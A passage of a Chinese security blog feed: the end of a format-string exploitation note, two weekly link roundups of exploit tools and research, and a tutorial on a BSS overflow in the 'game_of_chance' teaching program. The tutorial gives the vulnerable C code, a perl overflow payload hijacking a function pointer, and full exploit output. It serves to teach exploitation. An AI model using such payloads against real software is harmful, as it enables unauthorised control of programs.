<li><p>这次我们还是将shellcode放入到环境变量中，然后将exit函数的地址指向shellcode所存放的环境变量(这种一般是用在提权操作上,普通用户运行了setuid的程序)<br><img src="/2018/04/07/格式化字符串漏洞/shell1.png" alt=""><br><img src="/2018/04/07/格式化字符串漏洞/shell2.png" alt=""></p>
</li>
<li>如上，当程序调用exit函数的时候，通过PLT跳转并在GOT表中获取到了调用的地址,由于这个地址已经被修改为shellcode的入口地址，所以我们就获取到了root权限的shell。</li>
<li>可以写任意地址其实就提供了很多种可能性，只要是可写的内存且包含了程序执行流的都可以是写入的目标。<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>这里就主要过程做了说明，想要真正理解还需要自己动手去实践。<br><a href="https://github.com/kevien/exploitcode/tree/master/formatstringexp" target="_blank" rel="external">github repo</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li>《Hacking the art of exploitation》0x352</li>
<li>漏洞挖掘基础之格式化字符串<br><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-9426.html</a></li>
<li>格式化字符串漏洞简介<br><a href="http://drops.xmd5.com/static/drops/binary-7714.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/binary-7714.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，这两天学习了一下，仅当笔记留以
    
    </summary>
    
    
      <category term="reverse" scheme="http://kevien.github.io/tags/reverse/"/>
    
      <category term="linux" scheme="http://kevien.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>20180402安全动态</title>
    <link href="http://kevien.github.io/2018/04/02/20180402%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/04/02/20180402安全动态/</id>
    <published>2018-04-02T02:26:28.000Z</published>
    <updated>2018-04-04T05:43:37.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>使用 strace 调试管道与套接字之间的通信<br><a href="https://github.com/nh2/strace-pipes-presentation/blob/master/presentation/Debugging%20across%20pipes%20and%20sockets%20with%20strace.pdf" target="_blank" rel="external">https://github.com/nh2/strace-pipes-presentation/blob/master/presentation/Debugging%20across%20pipes%20and%20sockets%20with%20strace.pdf</a></li>
<li>如何编译、分析和调试基于 MIPS 架构的二进制文件<br><a href="https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html" target="_blank" rel="external">https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html</a></li>
<li>使用JTAG从设备内存中提取密码<br><a href="https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/" target="_blank" rel="external">https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/</a></li>
<li>如何在 Linux 中内存执行 ELF 二进制文件<br><a href="https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html" target="_blank" rel="external">https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html</a></li>
<li>探索 CobaltStrike 的 ExternalC2 框架<br><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/" target="_blank" rel="external">https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/</a></li>
<li>udtrace - 用于捕获 Unix 域套接字的 LD_PRELOAD 库<br><a href="http://laforge.gnumonks.org/blog/20180330-udtrace/" target="_blank" rel="external">http://laforge.gnumonks.org/blog/20180330-udtrace/</a></li>
<li>sRDI - 用于反射式 DLL 注入的 Shellcode 构造与加载工具<br><a href="https://github.com/ohjeongwook/sRDI" target="_blank" rel="external">https://github.com/ohjeongwook/sRDI</a></li>
<li>bleah - 用于攻击智能设备的 BLE 扫描器<br><a href="https://github.com/evilsocket/bleah" target="_blank" rel="external">https://github.com/evilsocket/bleah</a></li>
<li>Windows下的密码hash——Net-NTLMv1介绍<br><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/</a></li>
<li>关于利用rundll32执行程序的分析<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/</a></li>
<li>容器镜像安全概述<br><a href="http://blog.nsfocus.net/docker-mirror-security/" target="_blank" rel="external">http://blog.nsfocus.net/docker-mirror-security/</a></li>
<li>利用恶意页面攻击本地Xdebug<br><a href="https://xlab.tencent.com/cn/2018/03/30/pwn-local-xdebug/" target="_blank" rel="external">https://xlab.tencent.com/cn/2018/03/30/pwn-local-xdebug/</a></li>
<li>汇编语言入门教程<br><a href="https://mp.weixin.qq.com/s/HdiXqmQWvvvkhlIwMFzcvQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/HdiXqmQWvvvkhlIwMFzcvQ</a></li>
<li>绕过 ASLR+NX Part 1<br><a href="http://intx0x80.blogspot.com/2018/04/bypass-aslrnx-part-1.html" target="_blank" rel="external">http://intx0x80.blogspot.com/2018/04/bypass-aslrnx-part-1.html</a></li>
<li>DNS 解析器性能比较：CloudFlare / Google / Quad9 / OpenDNS<br><a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x68;&#x74;&#x74;&#x70;&#x73;&#58;&#47;&#47;&#x6d;&#x65;&#x64;&#x69;&#x75;&#109;&#x2e;&#99;&#111;&#x6d;&#47;&#x40;&#110;&#x79;&#x6b;&#x6f;&#108;&#97;&#x73;&#x2e;&#122;&#47;&#100;&#110;&#x73;&#45;&#114;&#101;&#x73;&#x6f;&#x6c;&#118;&#x65;&#x72;&#x73;&#x2d;&#112;&#x65;&#x72;&#x66;&#111;&#x72;&#109;&#x61;&#x6e;&#99;&#x65;&#x2d;&#x63;&#111;&#109;&#x70;&#97;&#114;&#x65;&#x64;&#45;&#x63;&#x6c;&#x6f;&#117;&#x64;&#x66;&#108;&#97;&#114;&#x65;&#45;&#x78;&#x2d;&#103;&#x6f;&#x6f;&#103;&#x6c;&#101;&#x2d;&#120;&#x2d;&#113;&#x75;&#x61;&#x64;&#57;&#x2d;&#x78;&#x2d;&#x6f;&#x70;&#101;&#x6e;&#x64;&#110;&#115;&#x2d;&#49;&#52;&#57;&#x65;&#x38;&#48;&#x33;&#55;&#x33;&#52;&#x65;&#53;">&#x68;&#x74;&#x74;&#x70;&#x73;&#58;&#47;&#47;&#x6d;&#x65;&#x64;&#x69;&#x75;&#109;&#x2e;&#99;&#111;&#x6d;&#47;&#x40;&#110;&#x79;&#x6b;&#x6f;&#108;&#97;&#x73;&#x2e;&#122;&#47;&#100;&#110;&#x73;&#45;&#114;&#101;&#x73;&#x6f;&#x6c;&#118;&#x65;&#x72;&#x73;&#x2d;&#112;&#x65;&#x72;&#x66;&#111;&#x72;&#109;&#x61;&#x6e;&#99;&#x65;&#x2d;&#x63;&#111;&#109;&#x70;&#97;&#114;&#x65;&#x64;&#45;&#x63;&#x6c;&#x6f;&#117;&#x64;&#x66;&#108;&#97;&#114;&#x65;&#45;&#x78;&#x2d;&#103;&#x6f;&#x6f;&#103;&#x6c;&#101;&#x2d;&#120;&#x2d;&#113;&#x75;&#x61;&#x64;&#57;&#x2d;&#x78;&#x2d;&#x6f;&#x70;&#101;&#x6e;&#x64;&#110;&#115;&#x2d;&#49;&#52;&#57;&#x65;&#x38;&#48;&#x33;&#55;&#x33;&#52;&#x65;&#53;</a></li>
<li>whonow - 用于执行 DNS Rebinding 攻击的恶意 DNS 服务器<br><a href="https://github.com/brannondorsey/whonow" target="_blank" rel="external">https://github.com/brannondorsey/whonow</a></li>
<li>Exim Off-by-one(CVE-2018-6789)漏洞复现分析<br><a href="https://paper.seebug.org/557/" target="_blank" rel="external">https://paper.seebug.org/557/</a></li>
<li>「驭龙」Linux执行命令监控驱动实现解析<br><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzI4MDg1NA==&amp;mid=2247483953&amp;idx=1&amp;sn=1c34aba130041bc6f4c6afdaf19eb1c7&amp;chksm=eb8c5688dcfbdf9eb69dcdfb852a1f54b2d6cd02b813dcd8986dbf6731be12dfe22e95b5550e&amp;mpshare=1&amp;scene=23&amp;srcid=0403lA8vkaQA3osZ2bKRIZ4a%23rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzI4MzI4MDg1NA==&amp;mid=2247483953&amp;idx=1&amp;sn=1c34aba130041bc6f4c6afdaf19eb1c7&amp;chksm=eb8c5688dcfbdf9eb69dcdfb852a1f54b2d6cd02b813dcd8986dbf6731be12dfe22e95b5550e&amp;mpshare=1&amp;scene=23&amp;srcid=0403lA8vkaQA3osZ2bKRIZ4a%23rd</a></li>
<li>使用内存取证技术寻找 Meterpreter 的踪迹<br><a href="https://articles.forensicfocus.com/2018/04/03/finding-metasploits-meterpreter-traces-with-memory-forensics/" target="_blank" rel="external">https://articles.forensicfocus.com/2018/04/03/finding-metasploits-meterpreter-traces-with-memory-forensics/</a></li>
<li>滥用组策略对象 GPO 攻击活动目录的方法介绍<br><a href="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" target="_blank" rel="external">https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e</a></li>
<li>逆向基础之 ESP 定律<br><a href="https://goggleheadedhacker.com/blog/post/6" target="_blank" rel="external">https://goggleheadedhacker.com/blog/post/6</a></li>
<li>gef -  GDB 功能增强工具<br><a href="https://github.com/hugsy/gef" target="_blank" rel="external">https://github.com/hugsy/gef</a></li>
<li>rubber-docker: 从头开始构建 Docker 的项目，帮助理解 Linux 容器技术<br><a href="https://github.com/Fewbytes/rubber-dockerhttps://docs.google.com/presentation/d/10vFQfEUvpf7qYyksNqiy-bAxcy-bvF0OnUElCOtTTRc/edit#slide=id.p" target="_blank" rel="external">https://github.com/Fewbytes/rubber-dockerhttps://docs.google.com/presentation/d/10vFQfEUvpf7qYyksNqiy-bAxcy-bvF0OnUElCOtTTRc/edit#slide=id.p</a></li>
<li>CanSecWest 2018 大部分议题材料已放出<br><a href="https://cansecwest.com/csw18archive.html" target="_blank" rel="external">https://cansecwest.com/csw18archive.html</a></li>
<li>Invoke-BSOD - 非管理员权限下触发 Windows 蓝屏的 PowerShell 脚本<br><a href="https://github.com/peewpw/Invoke-BSOD" target="_blank" rel="external">https://github.com/peewpw/Invoke-BSOD</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;使用 strace 调试管道与套接字之间的通信&lt;br&gt;&lt;a href=&quot;https://github.com/nh2/strace-pipes-presentation/blob/master/presentation/Debugging%20across%20
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180326安全动态</title>
    <link href="http://kevien.github.io/2018/03/26/20180326%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/03/26/20180326安全动态/</id>
    <published>2018-03-26T08:34:03.000Z</published>
    <updated>2018-03-30T09:14:09.862Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>return-to-csu：一种绕过 64 位 Linux ASLR 的新方法，来自 BlackHat Asia 2018<br><a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></li>
<li>DSCompromised：利用 Windows DSC 进行横向渗透的利用脚本<br><a href="https://github.com/matthastings/DSCompromised" target="_blank" rel="external">https://github.com/matthastings/DSCompromised</a></li>
<li>Apache httpd 2.4 漏洞一览<br><a href="https://httpd.apache.org/security/vulnerabilities_24.html" target="_blank" rel="external">https://httpd.apache.org/security/vulnerabilities_24.html</a></li>
<li>iCloudBrutter - AppleID 暴力破解脚本<br><a href="https://github.com/m4ll0k/iCloudBrutter" target="_blank" rel="external">https://github.com/m4ll0k/iCloudBrutter</a></li>
<li>通过 BLIND OOB XXE 获取文件系统访问权限<br><a href="https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/" target="_blank" rel="external">https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/</a></li>
<li>SSRF 漏洞的新时代 - 针对 URL 解析器的利用，来自 BlackHat Asia 2018<br><a href="https://www.blackhat.com/docs/asia-18/asia-18-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages_update_Thursday.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/asia-18/asia-18-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages_update_Thursday.pdf</a></li>
<li>JSON Web Token 安全性研究<br><a href="https://www.slideshare.net/snyff/jwt-insecurity" target="_blank" rel="external">https://www.slideshare.net/snyff/jwt-insecurity</a></li>
<li>MS-RDP 认证漏洞分析与利用（CVE-2018-0886）<br><a href="https://www.preempt.com/wp-content/uploads/White_paper_CredSSP.pdf" target="_blank" rel="external">https://www.preempt.com/wp-content/uploads/White_paper_CredSSP.pdf</a></li>
<li>Pwn a CTF Platform with Java JRMP Gadget<br><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="external">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li>
<li>第二届强网杯Web Writeup<br><a href="http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html" target="_blank" rel="external">http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html</a></li>
<li>深入解析 Linux - 符号解析的艺术<br><a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="external">https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488</a></li>
<li>ADRecon - 用于收集 Active Directory 信息的工具，并可生成 AD 环境当前状态的整体报告<br><a href="https://github.com/sense-of-security/ADRecon" target="_blank" rel="external">https://github.com/sense-of-security/ADRecon</a></li>
<li>客户端 session 导致的安全问题<br><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></li>
<li>红队渗透测试 5 方面大解密，介绍不同阶段的技术及工具等<br><a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#x68;&#116;&#x74;&#112;&#x73;&#58;&#47;&#47;&#109;&#101;&#x64;&#x69;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#x6d;&#47;&#64;&#97;&#x64;&#x61;&#109;&#x2e;&#x74;&#111;&#115;&#99;&#x68;&#x65;&#114;&#47;&#116;&#111;&#112;&#45;&#102;&#105;&#118;&#x65;&#45;&#119;&#97;&#x79;&#115;&#x2d;&#x74;&#104;&#x65;&#45;&#x72;&#101;&#100;&#x2d;&#x74;&#101;&#x61;&#109;&#45;&#x62;&#114;&#101;&#97;&#x63;&#104;&#x65;&#x64;&#x2d;&#x74;&#104;&#101;&#x2d;&#101;&#x78;&#116;&#x65;&#x72;&#110;&#x61;&#108;&#x2d;&#112;&#101;&#x72;&#105;&#x6d;&#x65;&#116;&#x65;&#114;&#x2d;&#50;&#x36;&#x32;&#102;&#57;&#x39;&#100;&#x63;&#57;&#x64;&#x31;&#55;">&#x68;&#116;&#x74;&#112;&#x73;&#58;&#47;&#47;&#109;&#101;&#x64;&#x69;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#x6d;&#47;&#64;&#97;&#x64;&#x61;&#109;&#x2e;&#x74;&#111;&#115;&#99;&#x68;&#x65;&#114;&#47;&#116;&#111;&#112;&#45;&#102;&#105;&#118;&#x65;&#45;&#119;&#97;&#x79;&#115;&#x2d;&#x74;&#104;&#x65;&#45;&#x72;&#101;&#100;&#x2d;&#x74;&#101;&#x61;&#109;&#45;&#x62;&#114;&#101;&#97;&#x63;&#104;&#x65;&#x64;&#x2d;&#x74;&#104;&#101;&#x2d;&#101;&#x78;&#116;&#x65;&#x72;&#110;&#x61;&#108;&#x2d;&#112;&#101;&#x72;&#105;&#x6d;&#x65;&#116;&#x65;&#114;&#x2d;&#50;&#x36;&#x32;&#102;&#57;&#x39;&#100;&#x63;&#57;&#x64;&#x31;&#55;</a></li>
<li>Hacking Tutorials 推荐的几本 hacking 书籍<br><a href="https://www.hackingtutorials.org/infosec-books/the-best-hacking-books-2018/" target="_blank" rel="external">https://www.hackingtutorials.org/infosec-books/the-best-hacking-books-2018/</a></li>
<li>利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单<br><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;return-to-csu：一种绕过 64 位 Linux ASLR 的新方法，来自 Black
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BSS段的溢出攻击</title>
    <link href="http://kevien.github.io/2018/03/22/BSS%E6%AE%B5%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://kevien.github.io/2018/03/22/BSS段的溢出攻击/</id>
    <published>2018-03-21T17:30:17.000Z</published>
    <updated>2018-04-06T21:34:07.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="external">wiki</a></li>
<li>测试环境ubuntu14.04X86.<h4 id="vul-code-snippet"><a href="#vul-code-snippet" class="headerlink" title="vul code snippet"></a>vul code snippet</h4></li>
<li><p>from game_of_chance.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Custom user struct to store information about users </div><div class="line">struct user &#123;</div><div class="line">    int uid;</div><div class="line">    int credits;</div><div class="line">    int highscore;</div><div class="line">    char name[100];</div><div class="line">    int (*current_game) ();</div><div class="line">&#125;;</div><div class="line"></div><div class="line">...</div><div class="line">struct user player;     // Player struct</div></pre></td></tr></table></figure>
</li>
<li><p>其中game_of_chance 是如下图的一个小游戏<br><img src="/2018/03/22/BSS段的溢出攻击/game.png" alt=""></p>
</li>
<li><p>如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">void input_name() &#123;</div><div class="line">   char *name_ptr, input_char=&apos;\n&apos;;</div><div class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</div><div class="line">   </div><div class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</div><div class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</div><div class="line">      *name_ptr = input_char;   // Put the input char into name field.</div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</div><div class="line">      name_ptr++;               // Increment the name pointer.</div><div class="line">   &#125;</div><div class="line">   *name_ptr = 0;  // Terminate the string.</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>这个函数会接收用户输入的名字直到遇到换行符，所以这里并没有有效的限制用户输入，就意味着可以被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行以及play_the_game()函数中，代码片段如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">if((choice &lt; 1) || (choice &gt; 7))</div><div class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</div><div class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</div><div class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</div><div class="line">             if(choice == 1)        // then point it at the selected game </div><div class="line">                player.current_game = pick_a_number;   </div><div class="line">             else if(choice == 2)                     </div><div class="line">                player.current_game = dealer_no_match;</div><div class="line">             else</div><div class="line">                player.current_game = find_the_ace;</div><div class="line">             last_game = choice;   // and set last_game.</div><div class="line">          &#125;</div><div class="line">          play_the_game();   // Play the game.</div><div class="line">       &#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>如果last_game 未设置，函数指针current_game 会被指向成0或者-1，这时不会触发漏洞，后面last_game被设置成1，当修改完名字完成对current_game覆盖再玩游戏1的时候，进入play_the_game()函数,play_the_game()会有current_game指针变量的调用，此时漏洞即触发！！！<br><img src="/2018/03/22/BSS段的溢出攻击/gamemain.png" alt=""></li>
<li>我们可以通过ctrl+z挂起当前的进程(这个时候last_game变量被设置成了1(因为刚才玩的是游戏choice是1))，我们找到可以被溢出的变量name，然后通过简单调试看一下name和current_game指针在内存中的位置关系。<br><img src="/2018/03/22/BSS段的溢出攻击/distance.png" alt=""></li>
<li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/03/22/BSS段的溢出攻击/flowattempt.png" alt=""></p>
<ul>
<li>可以看到程序崩溃之前curren_game已被成功覆盖为BBBB，这个时候我们需要一个”有效的”地址去做我们想要做的事情。</li>
<li>nm命令可以查看程序的符号表，来看一下程序有哪些函数以及其对应的内存地址（此思路常用于破解）。<br><img src="/2018/03/22/BSS段的溢出攻击/jackpot.png" alt=""></li>
<li>jackpot函数是我们理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有无数”金币”</li>
<li><p>这个程序通过标准输入进行用户交互，我们完全可以使用脚本实现自动化，如下的例子将会自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
</li>
<li><p>同样的技巧可以用到自动化exploit中，下面的命令会完成修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 90 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 11</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 80 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048ca5</div><div class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</div><div class="line">You have won the jackpot of 100 credits!</div><div class="line"></div><div class="line">You now have 180 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 180 credits] -&gt;  </div><div class="line">Thanks for playing! Bye.</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</div></pre></td></tr></table></figure>
</li>
<li><p>可以看到函数被调用我们增加了100金币</p>
</li>
